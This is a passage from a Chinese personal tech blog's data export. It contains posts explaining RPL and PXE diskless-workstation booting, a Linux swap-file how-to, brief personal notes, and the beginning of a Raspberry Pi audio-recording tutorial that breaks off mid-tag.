/><br /><br /><br /><br /><br /></p>"},{"title":"无盘工作站启动原理与实验要点","date":"2010-05-29T08:56:00.000Z","_content":"一、无盘工作站启动原理<br />无盘工作站之所以能够启动，是由硬件（工作站端）和软件（服务器端）共同配合的结果。软件上，就是服务器上的远程启动相关服务和无盘系统软件；硬件上，则 是工作站网卡上的BootROM芯片。当然，对于不是很老的主板，其BIOS中空闲较多并支持写入，可以将BootROM芯片代码写入主板BIOS中，节 省了一个芯片。<br /><br />较常用的无盘启动芯片有RPL和PXE两种。这两种较为通用，其它还有一些厂商开发的专用芯片，不是很普及，以下的讨论中均以RPL和PXE为主。<br /><br />RPL芯片可用于10M和100M的网卡，有针对NT（2000）的，有针对NetWare的。不同的网卡用的也不一样，需要配套。所以做无盘时不是任何 网卡都能做的。10M的NE2000和8029网卡、100M的8139网卡等都支持RPL芯片，并且也都容易找到相应的RPL芯片。<br /><br />PXE芯片一般用于100M的网卡，以在8139网卡上的应用最为成熟和典型，甚至很容易就可找到用于8139网卡的PXE芯片代码（用于写入主板或空白 BOOT片）。现在较常见的是那种RPL/PXE双启动的BootROM芯片，价格在6元左右。<br /><br />1、RPL芯片的启动原理。<br /><br />（1）发现阶段。当Client启动后，其网卡上的BootROM会向Server广播一个引导请求帧，即FIND帧，该帧包含有Client的网卡号 （MAC地址），网络上所有Server都会发现这个FIND帧。<br /><br />（2）提供阶段。Server远程启动服务收到Client广播的FIND帧，根据帧中所带的ID号，检查远程启动数据库中是否有该卡号的配置记录，如果 不存在，则引导过程不能继续；如果存在，远程启动服务发送一个FOUND帧，这个帧中包含了服务器的岗卡ID（即Server的MAC地址），然后就调用  BOOTP（Boot Protocol）或者DHCP（Dynamic Host Configuration Protocol）。<br /><br />（3）选择阶段。Client收到第一个响应后（因为可能网络中不止一个服务器在运行远程启动服务，Client只对收到的第一个FOUND帧回应，包 括：分配给Client的机器名称、IP地址、Server的IP地址、BOOT所需的映像文件等），则发送一个 SEND.FILE.REQUEST  Frame给第一个回应的远程启动服务器，请求传送启动所需的文件。<br /><br />（4）确认阶段。当远程启动服务器收到SEND.FILE.REQUEST Frame的请求后，根据其远程启动数据库的Client记录查找对应的  BOOT BLOCK，将Client启动所需的文件传送给Client，即给工作站一个FILE.DAT.RESPONSE帧，这个帧 包含了  Client启动所需的BOOT BLOCK。<br /><br />（5）启动阶段。Client接收到完整的启动文件后，开始执行文件中的程序，将执行点转向启动块的入口，启动Client，同时使用另外一个 INTERNET协议：TFTP（Trivial Transfer Protocol）。然后引导不同的OS。<br /><br />2、PXE芯片的启动原理。<br /><br />PXE是RPL的升级品，它是Preboot Execution  Environment的缩写。它们的不同之处为：一个是静态路由，一个动态路由。不难理解：RPL是根据网卡上的ID号加上其它的记录组成的Frame 向server发出请求，而server那里早已经有了这个ID数据，匹配成功则进行远程启动；PXE是则是根据服务器端收到的工作站MAC地址（就是网 卡号），使用DHCP服务给这个MAC地址指定一个IP地址，每次重启动可能同一台工作站有与上次启动有不同的IP，动态分配地址。下面以工作站引导过程 说明PXE的启动原理：<br />（1）用户端电脑开机后, PXE Boot ROM 获得控制权之前先做自我测试，然后以广播形式发出一个请求FIND帧。 <br />（2）如果服务器收到个人电脑所送出的要求, 就会送回 DHCP 回应, 内容包括用户端的 IP 地址, 预设通讯通道, 及开机映像文件。 否则,  服务器会忽略这个要求。 <br />（3）工作站收到服务器发回的响应后则会回应一个FRAME，以请求传送启动所需文件。<br />（4）之后，将有更多的讯息在用户端与服务器之间作应答, 用以决定启动参数。 BootPROM 由 TFTP 通讯协议从服务器下载开机映像档,  这个映像档就是软盘的映象文件。<br />（5）工作站使用TFTP 协议接收启动文件后，将控制权转交启动块，引导操作系统，完成远程启动。<br /><br />3、PXE与RPL无盘启动方案的比较<br />（1）虽然它们都是无盘启动，但是，RPL，毫无疑问，适合做无盘win95或假WIN98，不易做成内核为win98的无盘站。RPL唯一的好处是：比 较成熟，关于它的文章漫天皆是。 <br />（2）就构架整个网络来说，PXE要简单得多。这集中反映在对每台客户机的配置上：RPL要求每一台客户机都要执行安装过程，而PXE配置时，只需要每一 台客户机的MAC地址，把它写到netnames.db这个文件中就可以了，甚至连这个都可以自动完成。 <br />（3）就性能价格比来讲，PXE是RPL 的替代品，是无盘win95的“掘墓人”，从此，无盘启动技术进入了win98的时代。<br />（4）就适用范围来讲，有盘windows 98能延伸到什么地方，也就是这个技术也可以延伸到的地方。而win95  由于它内核上的限制，不能较好地与INTERNET接轨，其应用受到了极大的限制。 <br />（5）就可维护性讲，PXE空前绝后！PXE的每个工作站的配置都是从公共的windows目录下读取，删除了，无非是重新启动一次，不用在工作站作任何 的动作，系统将自动复原。 <br />（6）应用软件的安装。当你看中某个新的软件，并且打算把它安装在无盘工作站上时，用PXE安装，比如想在无盘win98中新加一个游戏，或以前没有  office2000，现在要安装office2000，很简单：用你那个上传的本地硬盘安装好后，上传一下，所有工作站都可以用了。而win95的应用 软件的安装就没有这么简单。<br /><br />现在客户端用的多的是PXE的芯片。<br />服务端“网众”的算是最为出色的。因为你最大的优势有linux版本的和硬盘直接读入。Linux就不用说了，速度上绝对的优势。从硬盘直接读入的优势就是速度快，同样他也支持img镜像的（慢）。<br /><br />1.服务端的实验在VMware 虚拟机上完全可以做。。<br />服务器有两个重要的组成。boot服务和io服务。<br />boot服务需要加密狗才能使用。windows已被破解。而linux现在还没有人破解。（至少我没有找到）<br />io服务可以不授权使用。这样。我们可以在windows平台做boot服务，linux做io服务。<br />安装工作站的时候要注意安装NWLINK ipx/spx/Netbios 协议。网卡属性——&gt;安装——&gt;协议——&gt;NWLINK ipx/spx/Netbios。有时候不安装有可能找不到服务端的虚拟磁盘。<br />2.客户端来测试，能接受boot服务器的数据。但不能加载io服务器的硬盘镜像。。why？嘿嘿。因为没有PXE芯片。","source":"_posts/无盘工作站启动原理与实验要点.md","raw":"title: 无盘工作站启动原理与实验要点\ncategories: [Windows,操作系统]\ntags: []\ndate: 2010-05-29 16:56:00\n---\n一、无盘工作站启动原理<br />无盘工作站之所以能够启动，是由硬件（工作站端）和软件（服务器端）共同配合的结果。软件上，就是服务器上的远程启动相关服务和无盘系统软件；硬件上，则 是工作站网卡上的BootROM芯片。当然，对于不是很老的主板，其BIOS中空闲较多并支持写入，可以将BootROM芯片代码写入主板BIOS中，节 省了一个芯片。<br /><br />较常用的无盘启动芯片有RPL和PXE两种。这两种较为通用，其它还有一些厂商开发的专用芯片，不是很普及，以下的讨论中均以RPL和PXE为主。<br /><br />RPL芯片可用于10M和100M的网卡，有针对NT（2000）的，有针对NetWare的。不同的网卡用的也不一样，需要配套。所以做无盘时不是任何 网卡都能做的。10M的NE2000和8029网卡、100M的8139网卡等都支持RPL芯片，并且也都容易找到相应的RPL芯片。<br /><br />PXE芯片一般用于100M的网卡，以在8139网卡上的应用最为成熟和典型，甚至很容易就可找到用于8139网卡的PXE芯片代码（用于写入主板或空白 BOOT片）。现在较常见的是那种RPL/PXE双启动的BootROM芯片，价格在6元左右。<br /><br />1、RPL芯片的启动原理。<br /><br />（1）发现阶段。当Client启动后，其网卡上的BootROM会向Server广播一个引导请求帧，即FIND帧，该帧包含有Client的网卡号 （MAC地址），网络上所有Server都会发现这个FIND帧。<br /><br />（2）提供阶段。Server远程启动服务收到Client广播的FIND帧，根据帧中所带的ID号，检查远程启动数据库中是否有该卡号的配置记录，如果 不存在，则引导过程不能继续；如果存在，远程启动服务发送一个FOUND帧，这个帧中包含了服务器的岗卡ID（即Server的MAC地址），然后就调用  BOOTP（Boot Protocol）或者DHCP（Dynamic Host Configuration Protocol）。<br /><br />（3）选择阶段。Client收到第一个响应后（因为可能网络中不止一个服务器在运行远程启动服务，Client只对收到的第一个FOUND帧回应，包 括：分配给Client的机器名称、IP地址、Server的IP地址、BOOT所需的映像文件等），则发送一个 SEND.FILE.REQUEST  Frame给第一个回应的远程启动服务器，请求传送启动所需的文件。<br /><br />（4）确认阶段。当远程启动服务器收到SEND.FILE.REQUEST Frame的请求后，根据其远程启动数据库的Client记录查找对应的  BOOT BLOCK，将Client启动所需的文件传送给Client，即给工作站一个FILE.DAT.RESPONSE帧，这个帧 包含了  Client启动所需的BOOT BLOCK。<br /><br />（5）启动阶段。Client接收到完整的启动文件后，开始执行文件中的程序，将执行点转向启动块的入口，启动Client，同时使用另外一个 INTERNET协议：TFTP（Trivial Transfer Protocol）。然后引导不同的OS。<br /><br />2、PXE芯片的启动原理。<br /><br />PXE是RPL的升级品，它是Preboot Execution  Environment的缩写。它们的不同之处为：一个是静态路由，一个动态路由。不难理解：RPL是根据网卡上的ID号加上其它的记录组成的Frame 向server发出请求，而server那里早已经有了这个ID数据，匹配成功则进行远程启动；PXE是则是根据服务器端收到的工作站MAC地址（就是网 卡号），使用DHCP服务给这个MAC地址指定一个IP地址，每次重启动可能同一台工作站有与上次启动有不同的IP，动态分配地址。下面以工作站引导过程 说明PXE的启动原理：<br />（1）用户端电脑开机后, PXE Boot ROM 获得控制权之前先做自我测试，然后以广播形式发出一个请求FIND帧。 <br />（2）如果服务器收到个人电脑所送出的要求, 就会送回 DHCP 回应, 内容包括用户端的 IP 地址, 预设通讯通道, 及开机映像文件。 否则,  服务器会忽略这个要求。 <br />（3）工作站收到服务器发回的响应后则会回应一个FRAME，以请求传送启动所需文件。<br />（4）之后，将有更多的讯息在用户端与服务器之间作应答, 用以决定启动参数。 BootPROM 由 TFTP 通讯协议从服务器下载开机映像档,  这个映像档就是软盘的映象文件。<br />（5）工作站使用TFTP 协议接收启动文件后，将控制权转交启动块，引导操作系统，完成远程启动。<br /><br />3、PXE与RPL无盘启动方案的比较<br />（1）虽然它们都是无盘启动，但是，RPL，毫无疑问，适合做无盘win95或假WIN98，不易做成内核为win98的无盘站。RPL唯一的好处是：比 较成熟，关于它的文章漫天皆是。 <br />（2）就构架整个网络来说，PXE要简单得多。这集中反映在对每台客户机的配置上：RPL要求每一台客户机都要执行安装过程，而PXE配置时，只需要每一 台客户机的MAC地址，把它写到netnames.db这个文件中就可以了，甚至连这个都可以自动完成。 <br />（3）就性能价格比来讲，PXE是RPL 的替代品，是无盘win95的“掘墓人”，从此，无盘启动技术进入了win98的时代。<br />（4）就适用范围来讲，有盘windows 98能延伸到什么地方，也就是这个技术也可以延伸到的地方。而win95  由于它内核上的限制，不能较好地与INTERNET接轨，其应用受到了极大的限制。 <br />（5）就可维护性讲，PXE空前绝后！PXE的每个工作站的配置都是从公共的windows目录下读取，删除了，无非是重新启动一次，不用在工作站作任何 的动作，系统将自动复原。 <br />（6）应用软件的安装。当你看中某个新的软件，并且打算把它安装在无盘工作站上时，用PXE安装，比如想在无盘win98中新加一个游戏，或以前没有  office2000，现在要安装office2000，很简单：用你那个上传的本地硬盘安装好后，上传一下，所有工作站都可以用了。而win95的应用 软件的安装就没有这么简单。<br /><br />现在客户端用的多的是PXE的芯片。<br />服务端“网众”的算是最为出色的。因为你最大的优势有linux版本的和硬盘直接读入。Linux就不用说了，速度上绝对的优势。从硬盘直接读入的优势就是速度快，同样他也支持img镜像的（慢）。<br /><br />1.服务端的实验在VMware 虚拟机上完全可以做。。<br />服务器有两个重要的组成。boot服务和io服务。<br />boot服务需要加密狗才能使用。windows已被破解。而linux现在还没有人破解。（至少我没有找到）<br />io服务可以不授权使用。这样。我们可以在windows平台做boot服务，linux做io服务。<br />安装工作站的时候要注意安装NWLINK ipx/spx/Netbios 协议。网卡属性——&gt;安装——&gt;协议——&gt;NWLINK ipx/spx/Netbios。有时候不安装有可能找不到服务端的虚拟磁盘。<br />2.客户端来测试，能接受boot服务器的数据。但不能加载io服务器的硬盘镜像。。why？嘿嘿。因为没有PXE芯片。","slug":"无盘工作站启动原理与实验要点","published":1,"updated":"2023-04-22T05:38:45.080Z","_id":"clgrjlxlr00b87opi3ak94p80","comments":1,"layout":"post","photos":[],"link":"","content":"<p>一、无盘工作站启动原理<br />无盘工作站之所以能够启动，是由硬件（工作站端）和软件（服务器端）共同配合的结果。软件上，就是服务器上的远程启动相关服务和无盘系统软件；硬件上，则 是工作站网卡上的BootROM芯片。当然，对于不是很老的主板，其BIOS中空闲较多并支持写入，可以将BootROM芯片代码写入主板BIOS中，节 省了一个芯片。<br /><br />较常用的无盘启动芯片有RPL和PXE两种。这两种较为通用，其它还有一些厂商开发的专用芯片，不是很普及，以下的讨论中均以RPL和PXE为主。<br /><br />RPL芯片可用于10M和100M的网卡，有针对NT（2000）的，有针对NetWare的。不同的网卡用的也不一样，需要配套。所以做无盘时不是任何 网卡都能做的。10M的NE2000和8029网卡、100M的8139网卡等都支持RPL芯片，并且也都容易找到相应的RPL芯片。<br /><br />PXE芯片一般用于100M的网卡，以在8139网卡上的应用最为成熟和典型，甚至很容易就可找到用于8139网卡的PXE芯片代码（用于写入主板或空白 BOOT片）。现在较常见的是那种RPL&#x2F;PXE双启动的BootROM芯片，价格在6元左右。<br /><br />1、RPL芯片的启动原理。<br /><br />（1）发现阶段。当Client启动后，其网卡上的BootROM会向Server广播一个引导请求帧，即FIND帧，该帧包含有Client的网卡号 （MAC地址），网络上所有Server都会发现这个FIND帧。<br /><br />（2）提供阶段。Server远程启动服务收到Client广播的FIND帧，根据帧中所带的ID号，检查远程启动数据库中是否有该卡号的配置记录，如果 不存在，则引导过程不能继续；如果存在，远程启动服务发送一个FOUND帧，这个帧中包含了服务器的岗卡ID（即Server的MAC地址），然后就调用  BOOTP（Boot Protocol）或者DHCP（Dynamic Host Configuration Protocol）。<br /><br />（3）选择阶段。Client收到第一个响应后（因为可能网络中不止一个服务器在运行远程启动服务，Client只对收到的第一个FOUND帧回应，包 括：分配给Client的机器名称、IP地址、Server的IP地址、BOOT所需的映像文件等），则发送一个 SEND.FILE.REQUEST  Frame给第一个回应的远程启动服务器，请求传送启动所需的文件。<br /><br />（4）确认阶段。当远程启动服务器收到SEND.FILE.REQUEST Frame的请求后，根据其远程启动数据库的Client记录查找对应的  BOOT BLOCK，将Client启动所需的文件传送给Client，即给工作站一个FILE.DAT.RESPONSE帧，这个帧 包含了  Client启动所需的BOOT BLOCK。<br /><br />（5）启动阶段。Client接收到完整的启动文件后，开始执行文件中的程序，将执行点转向启动块的入口，启动Client，同时使用另外一个 INTERNET协议：TFTP（Trivial Transfer Protocol）。然后引导不同的OS。<br /><br />2、PXE芯片的启动原理。<br /><br />PXE是RPL的升级品，它是Preboot Execution  Environment的缩写。它们的不同之处为：一个是静态路由，一个动态路由。不难理解：RPL是根据网卡上的ID号加上其它的记录组成的Frame 向server发出请求，而server那里早已经有了这个ID数据，匹配成功则进行远程启动；PXE是则是根据服务器端收到的工作站MAC地址（就是网 卡号），使用DHCP服务给这个MAC地址指定一个IP地址，每次重启动可能同一台工作站有与上次启动有不同的IP，动态分配地址。下面以工作站引导过程 说明PXE的启动原理：<br />（1）用户端电脑开机后, PXE Boot ROM 获得控制权之前先做自我测试，然后以广播形式发出一个请求FIND帧。 <br />（2）如果服务器收到个人电脑所送出的要求, 就会送回 DHCP 回应, 内容包括用户端的 IP 地址, 预设通讯通道, 及开机映像文件。 否则,  服务器会忽略这个要求。 <br />（3）工作站收到服务器发回的响应后则会回应一个FRAME，以请求传送启动所需文件。<br />（4）之后，将有更多的讯息在用户端与服务器之间作应答, 用以决定启动参数。 BootPROM 由 TFTP 通讯协议从服务器下载开机映像档,  这个映像档就是软盘的映象文件。<br />（5）工作站使用TFTP 协议接收启动文件后，将控制权转交启动块，引导操作系统，完成远程启动。<br /><br />3、PXE与RPL无盘启动方案的比较<br />（1）虽然它们都是无盘启动，但是，RPL，毫无疑问，适合做无盘win95或假WIN98，不易做成内核为win98的无盘站。RPL唯一的好处是：比 较成熟，关于它的文章漫天皆是。 <br />（2）就构架整个网络来说，PXE要简单得多。这集中反映在对每台客户机的配置上：RPL要求每一台客户机都要执行安装过程，而PXE配置时，只需要每一 台客户机的MAC地址，把它写到netnames.db这个文件中就可以了，甚至连这个都可以自动完成。 <br />（3）就性能价格比来讲，PXE是RPL 的替代品，是无盘win95的“掘墓人”，从此，无盘启动技术进入了win98的时代。<br />（4）就适用范围来讲，有盘windows 98能延伸到什么地方，也就是这个技术也可以延伸到的地方。而win95  由于它内核上的限制，不能较好地与INTERNET接轨，其应用受到了极大的限制。 <br />（5）就可维护性讲，PXE空前绝后！PXE的每个工作站的配置都是从公共的windows目录下读取，删除了，无非是重新启动一次，不用在工作站作任何 的动作，系统将自动复原。 <br />（6）应用软件的安装。当你看中某个新的软件，并且打算把它安装在无盘工作站上时，用PXE安装，比如想在无盘win98中新加一个游戏，或以前没有  office2000，现在要安装office2000，很简单：用你那个上传的本地硬盘安装好后，上传一下，所有工作站都可以用了。而win95的应用 软件的安装就没有这么简单。<br /><br />现在客户端用的多的是PXE的芯片。<br />服务端“网众”的算是最为出色的。因为你最大的优势有linux版本的和硬盘直接读入。Linux就不用说了，速度上绝对的优势。从硬盘直接读入的优势就是速度快，同样他也支持img镜像的（慢）。<br /><br />1.服务端的实验在VMware 虚拟机上完全可以做。。<br />服务器有两个重要的组成。boot服务和io服务。<br />boot服务需要加密狗才能使用。windows已被破解。而linux现在还没有人破解。（至少我没有找到）<br />io服务可以不授权使用。这样。我们可以在windows平台做boot服务，linux做io服务。<br />安装工作站的时候要注意安装NWLINK ipx&#x2F;spx&#x2F;Netbios 协议。网卡属性——&gt;安装——&gt;协议——&gt;NWLINK ipx&#x2F;spx&#x2F;Netbios。有时候不安装有可能找不到服务端的虚拟磁盘。<br />2.客户端来测试，能接受boot服务器的数据。但不能加载io服务器的硬盘镜像。。why？嘿嘿。因为没有PXE芯片。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>一、无盘工作站启动原理<br />无盘工作站之所以能够启动，是由硬件（工作站端）和软件（服务器端）共同配合的结果。软件上，就是服务器上的远程启动相关服务和无盘系统软件；硬件上，则 是工作站网卡上的BootROM芯片。当然，对于不是很老的主板，其BIOS中空闲较多并支持写入，可以将BootROM芯片代码写入主板BIOS中，节 省了一个芯片。<br /><br />较常用的无盘启动芯片有RPL和PXE两种。这两种较为通用，其它还有一些厂商开发的专用芯片，不是很普及，以下的讨论中均以RPL和PXE为主。<br /><br />RPL芯片可用于10M和100M的网卡，有针对NT（2000）的，有针对NetWare的。不同的网卡用的也不一样，需要配套。所以做无盘时不是任何 网卡都能做的。10M的NE2000和8029网卡、100M的8139网卡等都支持RPL芯片，并且也都容易找到相应的RPL芯片。<br /><br />PXE芯片一般用于100M的网卡，以在8139网卡上的应用最为成熟和典型，甚至很容易就可找到用于8139网卡的PXE芯片代码（用于写入主板或空白 BOOT片）。现在较常见的是那种RPL&#x2F;PXE双启动的BootROM芯片，价格在6元左右。<br /><br />1、RPL芯片的启动原理。<br /><br />（1）发现阶段。当Client启动后，其网卡上的BootROM会向Server广播一个引导请求帧，即FIND帧，该帧包含有Client的网卡号 （MAC地址），网络上所有Server都会发现这个FIND帧。<br /><br />（2）提供阶段。Server远程启动服务收到Client广播的FIND帧，根据帧中所带的ID号，检查远程启动数据库中是否有该卡号的配置记录，如果 不存在，则引导过程不能继续；如果存在，远程启动服务发送一个FOUND帧，这个帧中包含了服务器的岗卡ID（即Server的MAC地址），然后就调用  BOOTP（Boot Protocol）或者DHCP（Dynamic Host Configuration Protocol）。<br /><br />（3）选择阶段。Client收到第一个响应后（因为可能网络中不止一个服务器在运行远程启动服务，Client只对收到的第一个FOUND帧回应，包 括：分配给Client的机器名称、IP地址、Server的IP地址、BOOT所需的映像文件等），则发送一个 SEND.FILE.REQUEST  Frame给第一个回应的远程启动服务器，请求传送启动所需的文件。<br /><br />（4）确认阶段。当远程启动服务器收到SEND.FILE.REQUEST Frame的请求后，根据其远程启动数据库的Client记录查找对应的  BOOT BLOCK，将Client启动所需的文件传送给Client，即给工作站一个FILE.DAT.RESPONSE帧，这个帧 包含了  Client启动所需的BOOT BLOCK。<br /><br />（5）启动阶段。Client接收到完整的启动文件后，开始执行文件中的程序，将执行点转向启动块的入口，启动Client，同时使用另外一个 INTERNET协议：TFTP（Trivial Transfer Protocol）。然后引导不同的OS。<br /><br />2、PXE芯片的启动原理。<br /><br />PXE是RPL的升级品，它是Preboot Execution  Environment的缩写。它们的不同之处为：一个是静态路由，一个动态路由。不难理解：RPL是根据网卡上的ID号加上其它的记录组成的Frame 向server发出请求，而server那里早已经有了这个ID数据，匹配成功则进行远程启动；PXE是则是根据服务器端收到的工作站MAC地址（就是网 卡号），使用DHCP服务给这个MAC地址指定一个IP地址，每次重启动可能同一台工作站有与上次启动有不同的IP，动态分配地址。下面以工作站引导过程 说明PXE的启动原理：<br />（1）用户端电脑开机后, PXE Boot ROM 获得控制权之前先做自我测试，然后以广播形式发出一个请求FIND帧。 <br />（2）如果服务器收到个人电脑所送出的要求, 就会送回 DHCP 回应, 内容包括用户端的 IP 地址, 预设通讯通道, 及开机映像文件。 否则,  服务器会忽略这个要求。 <br />（3）工作站收到服务器发回的响应后则会回应一个FRAME，以请求传送启动所需文件。<br />（4）之后，将有更多的讯息在用户端与服务器之间作应答, 用以决定启动参数。 BootPROM 由 TFTP 通讯协议从服务器下载开机映像档,  这个映像档就是软盘的映象文件。<br />（5）工作站使用TFTP 协议接收启动文件后，将控制权转交启动块，引导操作系统，完成远程启动。<br /><br />3、PXE与RPL无盘启动方案的比较<br />（1）虽然它们都是无盘启动，但是，RPL，毫无疑问，适合做无盘win95或假WIN98，不易做成内核为win98的无盘站。RPL唯一的好处是：比 较成熟，关于它的文章漫天皆是。 <br />（2）就构架整个网络来说，PXE要简单得多。这集中反映在对每台客户机的配置上：RPL要求每一台客户机都要执行安装过程，而PXE配置时，只需要每一 台客户机的MAC地址，把它写到netnames.db这个文件中就可以了，甚至连这个都可以自动完成。 <br />（3）就性能价格比来讲，PXE是RPL 的替代品，是无盘win95的“掘墓人”，从此，无盘启动技术进入了win98的时代。<br />（4）就适用范围来讲，有盘windows 98能延伸到什么地方，也就是这个技术也可以延伸到的地方。而win95  由于它内核上的限制，不能较好地与INTERNET接轨，其应用受到了极大的限制。 <br />（5）就可维护性讲，PXE空前绝后！PXE的每个工作站的配置都是从公共的windows目录下读取，删除了，无非是重新启动一次，不用在工作站作任何 的动作，系统将自动复原。 <br />（6）应用软件的安装。当你看中某个新的软件，并且打算把它安装在无盘工作站上时，用PXE安装，比如想在无盘win98中新加一个游戏，或以前没有  office2000，现在要安装office2000，很简单：用你那个上传的本地硬盘安装好后，上传一下，所有工作站都可以用了。而win95的应用 软件的安装就没有这么简单。<br /><br />现在客户端用的多的是PXE的芯片。<br />服务端“网众”的算是最为出色的。因为你最大的优势有linux版本的和硬盘直接读入。Linux就不用说了，速度上绝对的优势。从硬盘直接读入的优势就是速度快，同样他也支持img镜像的（慢）。<br /><br />1.服务端的实验在VMware 虚拟机上完全可以做。。<br />服务器有两个重要的组成。boot服务和io服务。<br />boot服务需要加密狗才能使用。windows已被破解。而linux现在还没有人破解。（至少我没有找到）<br />io服务可以不授权使用。这样。我们可以在windows平台做boot服务，linux做io服务。<br />安装工作站的时候要注意安装NWLINK ipx&#x2F;spx&#x2F;Netbios 协议。网卡属性——&gt;安装——&gt;协议——&gt;NWLINK ipx&#x2F;spx&#x2F;Netbios。有时候不安装有可能找不到服务端的虚拟磁盘。<br />2.客户端来测试，能接受boot服务器的数据。但不能加载io服务器的硬盘镜像。。why？嘿嘿。因为没有PXE芯片。</p>\n"},{"title":"无聊","date":"2010-04-14T12:03:00.000Z","_content":"无聊时，扫扫雷，玩玩纸牌。简单也是一种乐趣、、","source":"_posts/无聊.md","raw":"title: 无聊\ncategories: [生活感想]\ntags: []\ndate: 2010-04-14 20:03:00\n---\n无聊时，扫扫雷，玩玩纸牌。简单也是一种乐趣、、","slug":"无聊","published":1,"updated":"2023-04-22T05:38:45.083Z","_id":"clgrjlxls00ba7opi3hdv494e","comments":1,"layout":"post","photos":[],"link":"","content":"<p>无聊时，扫扫雷，玩玩纸牌。简单也是一种乐趣、、</p>\n","site":{"data":{}},"excerpt":"","more":"<p>无聊时，扫扫雷，玩玩纸牌。简单也是一种乐趣、、</p>\n"},{"title":"我和别人没有仇啊","date":"2011-01-19T07:28:00.000Z","_content":"老大谁社工我啊、\n没有给谁有愁啊。。\n<img height=\"50\" src=\"/images/pic/other_site/img_baidu_j_0016.gif\" width=\"50\" />\n<img height=\"50\" src=\"/images/pic/other_site/img_baidu_j_0016.gif\" width=\"50\" />\n<img height=\"50\" src=\"/images/pic/other_site/img_baidu_j_0016.gif\" width=\"50\" />\n见图片：\n<img src=\"/images/pic/af0165337e3135c9a9018ec7.jpg\" small=\"0\" /><br />","source":"_posts/我和别人没有仇啊.md","raw":"title: 我和别人没有仇啊\ncategories: [生活感想]\ntags: []\ndate: 2011-01-19 15:28:00\n---\n老大谁社工我啊、\n没有给谁有愁啊。。\n<img height=\"50\" src=\"/images/pic/other_site/img_baidu_j_0016.gif\" width=\"50\" />\n<img height=\"50\" src=\"/images/pic/other_site/img_baidu_j_0016.gif\" width=\"50\" />\n<img height=\"50\" src=\"/images/pic/other_site/img_baidu_j_0016.gif\" width=\"50\" />\n见图片：\n<img src=\"/images/pic/af0165337e3135c9a9018ec7.jpg\" small=\"0\" /><br />","slug":"我和别人没有仇啊","published":1,"updated":"2023-04-22T05:38:45.066Z","_id":"clgrjlxlu00bc7opi7lk8g2x1","comments":1,"layout":"post","photos":[],"link":"","content":"<p>老大谁社工我啊、<br>没有给谁有愁啊。。<br><img height=\"50\" src=\"/images/pic/other_site/img_baidu_j_0016.gif\" width=\"50\" /><br><img height=\"50\" src=\"/images/pic/other_site/img_baidu_j_0016.gif\" width=\"50\" /><br><img height=\"50\" src=\"/images/pic/other_site/img_baidu_j_0016.gif\" width=\"50\" /><br>见图片：<br><img src=\"/images/pic/af0165337e3135c9a9018ec7.jpg\" small=\"0\" /><br /></p>\n","site":{"data":{}},"excerpt":"","more":"<p>老大谁社工我啊、<br>没有给谁有愁啊。。<br><img height=\"50\" src=\"/images/pic/other_site/img_baidu_j_0016.gif\" width=\"50\" /><br><img height=\"50\" src=\"/images/pic/other_site/img_baidu_j_0016.gif\" width=\"50\" /><br><img height=\"50\" src=\"/images/pic/other_site/img_baidu_j_0016.gif\" width=\"50\" /><br>见图片：<br><img src=\"/images/pic/af0165337e3135c9a9018ec7.jpg\" small=\"0\" /><br /></p>\n"},{"title":"添加 swap文件问题","date":"2011-03-30T08:17:00.000Z","_content":"<p>1、必须为超级用户<br />2、/dd if=/dev/zero of=swapfile bs=1024 count=2048<br />3、mkswap swapfile&nbsp;&nbsp;    #初始化swapfile<br />4、swapon swapfile&nbsp; #挂载<br />5、swapon -s&nbsp; #查看状态<br />6、swapoff swapfile&nbsp; #卸载</p>","source":"_posts/添加-swap文件问题.md","raw":"title: 添加 swap文件问题\ncategories: [Linux]\ntags: []\ndate: 2011-03-30 16:17:00\n---\n<p>1、必须为超级用户<br />2、/dd if=/dev/zero of=swapfile bs=1024 count=2048<br />3、mkswap swapfile&nbsp;&nbsp;    #初始化swapfile<br />4、swapon swapfile&nbsp; #挂载<br />5、swapon -s&nbsp; #查看状态<br />6、swapoff swapfile&nbsp; #卸载</p>","slug":"添加-swap文件问题","published":1,"updated":"2023-04-22T05:38:45.100Z","_id":"clgrjlxlv00be7opigkc4elfz","comments":1,"layout":"post","photos":[],"link":"","content":"<p>1、必须为超级用户<br />2、/dd if=/dev/zero of=swapfile bs=1024 count=2048<br />3、mkswap swapfile&nbsp;&nbsp;    #初始化swapfile<br />4、swapon swapfile&nbsp; #挂载<br />5、swapon -s&nbsp; #查看状态<br />6、swapoff swapfile&nbsp; #卸载</p>","site":{"data":{}},"excerpt":"","more":"<p>1、必须为超级用户<br />2、/dd if=/dev/zero of=swapfile bs=1024 count=2048<br />3、mkswap swapfile&nbsp;&nbsp;    #初始化swapfile<br />4、swapon swapfile&nbsp; #挂载<br />5、swapon -s&nbsp; #查看状态<br />6、swapoff swapfile&nbsp; #卸载</p>"},{"title":"树莓派进行录音和音频降噪","date":"2019-10-28T13:48:00.000Z","_content":"<!-- wp:paragraph -->\n<p>&nbsp;</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>树莓派最近开始清理清理上面的灰,玩一些东西.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>录音设备使用USB摄像头集成的录音功能(N年前的老货,开始发挥余热),使用命令查询设备是否被发现.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p><code><!--?prettify linenums=true?--></code></p>\n<pre class=\"prettyprint\">pi@raspberrypi:~/workdir $ arecord -l\n**** List of CAPTURE Hardware Devices ****\ncard 1: CAMERA [USB2.0 PC CAMERA], device 0: USB Audio [USB Audio]\nSubdevices: 1/1\nSubdevice #0: subdevice #0</pre>\n<p><code></code></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>1.使用arecord命令进行录音记录,默认不添加-d参数,一直进行录制.(ctrl+c可以结束掉它)</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<pre class=\"prettyprint\">pi@raspberrypi:~/workdir $ arecord -D \"plughw:1,0\" -r 16000 -c 1 -t wav -f S16_LE 2019102820252.wav\nRecording WAVE '20191028.wav' : Signed 16 bit Little Endian, Rate 16000 Hz, Mono\n^CAborted by signal Interrupt…\narecord: pcm_read:2103: read error: Interrupted system call</pre>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<p>2.使用audacity进行杂音取样.选中杂音段进行文件导出.(选择文件-&gt;导出音频-&gt;选择wav格式即可,保持文件名称noise.wav)</p>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:image {\"id\":589} --></p>\n<figure class=\"wp-block-image\"><img class=\"wp-image-589\" 